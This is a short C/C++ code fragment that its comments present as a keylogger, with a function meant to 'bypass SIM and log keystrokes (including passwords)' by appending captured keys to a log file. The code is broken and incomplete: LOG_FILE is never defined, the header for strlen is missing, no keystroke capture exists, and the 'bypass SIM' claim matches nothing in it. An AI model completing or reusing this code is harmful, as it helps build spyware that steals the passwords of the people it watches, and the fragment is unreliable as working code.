#include <stdio.h>
#include <stdlib.h>

// Forward declaration of functions
extern "C" {
    void log_key(char* c_char);
}

// Function to bypass SIM and log keystrokes (including passwords)
void log_key(char* key) {
    // Write the keystroke data to a file
    FILE* f = fopen(LOG_FILE, "a");  // Append mode
    fwrite(key, sizeof(char), strlen(key), f);  // Write the key stroke data
    fclose(f);
}

